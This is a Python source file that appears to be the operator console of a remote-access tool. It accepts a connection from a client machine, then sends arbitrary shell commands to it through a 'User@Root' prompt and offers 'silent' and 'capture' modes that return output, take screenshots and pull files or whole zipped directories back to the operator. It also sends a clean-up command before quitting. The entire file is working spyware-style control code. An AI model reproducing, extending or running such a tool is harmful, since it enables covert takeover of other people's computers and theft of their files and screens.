from Sockets import Socket
import subprocess
import os
import time


_exec = "python3 scripts/pServer.py"

serverSocket = Socket()
ser_sock = serverSocket.sock_ser
server = serverSocket.sock
conn, addr = serverSocket.serverCommands()

path_to_dir = "out_server"

if not os.path.exists(path_to_dir):
    os.makedirs(path_to_dir)


def recv_files(fname):
    length_of_file = conn.recv(8192)
    print("Total length of file : {} bytes".format(float(length_of_file)))
    new_length = 0
    time.sleep(1)
    print("Receiving files :")
    with open(os.path.join(path_to_dir, fname), "wb") as out_file:
        while True:
            new_bytes = conn.recv(8192)
            new_length += len(new_bytes)
            out_file.write(new_bytes)
            time.sleep(0.1)
            print("{} '%'completed ".format(
                (round(float(new_length)) / round(float(length_of_file))) * 100))
            if new_length >= float(length_of_file):
                break


def sendOverSock(message="", encoding=True):
    if encoding:
        conn.sendall(message.encode('utf-8'))
    else:
        conn.sendall(message)
    return


def recvOverSock(buffsize=1024, decoding=True):
    if decoding:
        recv_data = conn.recv(buffsize).decode('utf-8')
    else:
        recv_data = conn.recv(buffsize)
    return recv_data


def silentMode():
    """ Initialise Silent Mode """
    sendOverSock("silent_mode")
    while True:

        print("|| Silent Mode ||\nUsages -- \n1. Static output\n2. Dynamic Save to file\n3. Standalone commands\n4. Return.")

        try:
            sil_ch = int(input("Enter your choice : "))
        except ValueError:
            print("Invalid choice.\n")
            continue

        if not 0 < sil_ch < 5:
            print("Invalid choice.\n")
            continue

        if sil_ch == 1:
            print("CAUTION : Use commands that produce static output only!")
            print("To end, type 'end' at prompt.")
            sendOverSock("static_mode")
            while True:

                user_commands = str(input("User@Root >>>> "))
                if "ping" in user_commands or "tcpdump" in user_commands:
                    print("WARNING : Use commands that produce static output only!")
                    continue

                if user_commands == 'end':
                    sendOverSock("end")
                    break
                sendOverSock(user_commands)
                time.sleep(0.2)
                conn.settimeout(5)
                try:
                    data_input = recvOverSock(8192)
                    print(data_input)
                except ser_sock.timeout:
                    print("TimeoutExpired!. Use commands that produce static output")
                    conn.settimeout(None)
                    continue

        if sil_ch == 2:
            print(
                "To end, type 'end' at prompt.\nYour output will be saved in './out/*_out.txt' file.")
            print(
                "To run command for 'n' seconds, specify seconds at end.\neg. ping address 20")
            sendOverSock("dyn_out_to_file")
            while True:

                user_commands = str(input("User@Root >>>> "))
                if user_commands == 'end':
                    conn.sendall('end'.encode('utf-8'))
                    break

                command = user_commands.split(" ")
                if command[-1].isdigit():
                    conn.sendall(user_commands.encode('utf-8'))
                    print("Executing command for {} sec. Please wait.".format(
                        command[-1]))

                    if command[0] == "sudo":
                        fname = command[0] + "_" + command[1] + "_out.txt"
                    else:
                        fname = command[0] + "_out.txt"
                    conn.settimeout(int(command[-1]) + 3)
                    try:
                        recv_files(fname)
                        print("done sending file")
                    except ser_sock.timeout:
                        print("TimeoutExpired!.")
                        conn.settimeout(None)
                        continue
                else:
                    print("Please specify timeout.")
                    continue

        if sil_ch == 3:
            print("CAUTION : Use commands that produce static output only!")
            print("To end, type 'end' at prompt.")
            sendOverSock("stdlone_cmd")
            while True:

                user_commands = str(input("User@Root >>>> "))
                if "ping" in user_commands or "tcpdump" in user_commands:
                    print("WARNING : Use commands that produce static output only!")
                    continue
                if user_commands == 'end':
                    sendOverSock("end")
                    break
                sendOverSock(user_commands)
                time.sleep(0.2)
                conn.settimeout(5)
                try:
                    data_input = recvOverSock(8192)
                    print(data_input)
                except ser_sock.timeout:
                    print("TimeoutExpired!")
                    conn.settimeout(None)
                    continue

        if sil_ch == 4:
            sendOverSock("go_to_main")
            return


def captureMode():
    """ Initialise Capture Mode """
    sendOverSock("capture_mode")

    while True:
        print("|| Capture Mode ||\nUsages -- \n1. Execute shell commands.\n2. Take a Screenshot.\n3. Return.")
        try:
            cap_ch = int(input("Enter your choice : "))
        except ValueError:
            print("Invalid choice.\n")
            continue

        if not 0 < cap_ch < 6:
            print("Invalid choice.\n")
            continue

        if cap_ch == 1:
            print("To end, type 'end' at prompt.")

            while True:

                user_commands = str(input("User@Root >>>> "))
                if user_commands == 'end':
                    break
                sendOverSock(user_commands)

        if cap_ch == 2:
            print("Your output files will be stored in 'out' folder.")
            sendOverSock("fetch_cap_mode")
            time.sleep(1)
            return

        if cap_ch == 3:
            sendOverSock("go_to_main")
            return


def cleanUp():
    """ Initialising cleanUp Mode """
    sendOverSock("init_clean_mode")
    return


def fetchAllFiles():
    """ Initialise Fetching files Mode """

    sendOverSock("ready_to_fetch")
    while True:
        print("|| Transfer Mode ||\nUsages -- \n1. Fetch specific files/dir from out directory.\n2. Fetch all from out directory.\n3. Return.")
        try:
            f_ch = int(input("Enter your choice : "))
        except ValueError:
            print("Invalid choice.\n")
            continue

        if not 0 < f_ch < 4:
            print("Invalid choice.\n")
            continue

        if f_ch == 3:
            sendOverSock("go_to_main")
            return

        if f_ch == 1:
            sendOverSock("fetch_specific")
            conn.settimeout(2)
            try:
                data_list = recvOverSock(8192)
                print(data_list)
            except ser_sock.timeout:
                print("TimeoutExpired while fetching dir list.")
                continue

            print("To exit, type 'end' at prompt.")
            while True:
                user_file = str(input("User@Root >>>> "))
                if user_file == "":
                    continue

                if user_file == 'end':
                    sendOverSock("end")
                    return

                sendOverSock(user_file)
                conn.settimeout(5)
                try:
                    status = conn.recv(1024).decode('utf-8')
                    if int(status) == -1:
                        print("File not found.")
                        continue
                    if int(status) == 1:
                        print("File found.")
                        if "." in user_file:
                            recv_files("out_" + user_file)
                            print("File saved as out_" + user_file)

                        if "." not in user_file:
                            recv_files("out_" + user_file + ".zip")
                            print("File saved as out_" + user_file + ".zip")

                except ser_sock.timeout:
                    print("TimeoutExpired! while checking for file. ")
                    conn.settimeout(None)
                    continue

        if f_ch == 2:
            sendOverSock("fetch_all")
            conn.settimeout(100)
            try:
                recv_files("out.zip")
                print("Done sending file\nFile saved as out.zip")
                time.sleep(2)
            except ser_sock.timeout:
                print("TimeoutExpired! while waiting for all files.")
                conn.settimeout(None)
                continue


def main():

    print("\nClient Machine with the ip : {} has connected on port : {}\n\n".format(
        addr[0], str(addr[1])))
    sendOverSock("Server is now connected.", True)

    print("Initialising chat with client on new window.\nYou may proceed with your options on the current window.\n")
    time.sleep(3)
    os.system("gnome-terminal -e 'bash -c \"" + _exec + "; exec bash\"'")

    while True:

        printInit()
        try:
            ch = int(input("Enter your choice : "))
        except ValueError:
            print("Invalid choice.\n")
            continue

        if not 0 < ch < 6:
            print("Invalid choice.\n")
            continue

        if ch is 1:
            silentMode()

        if ch is 2:
            captureMode()

        if ch is 3:
            fetchAllFiles()

        if ch is 4:
            cleanUp()
            closeConn()
            exit(0)

# end of main


def printInit():
    print("******************************")
    print("1. Silent Mode")
    print(" --> Static output")
    print(" --> Dynamic Save to file")
    print(" --> Standalone commands")
    print("2. Capture Mode")
    print(" --> Execute shell commands")
    print(" --> Take a Screenshot")
    print("3. Fetch All files")
    print(" --> Fetch specific files/dir from out directory")
    print(" --> Fetch all from out directory")
    print("4. Clean up & Quit")
    print("******************************")
    return


def closeConn():
    serverSocket.shutdown()


if __name__ == "__main__":
    main()
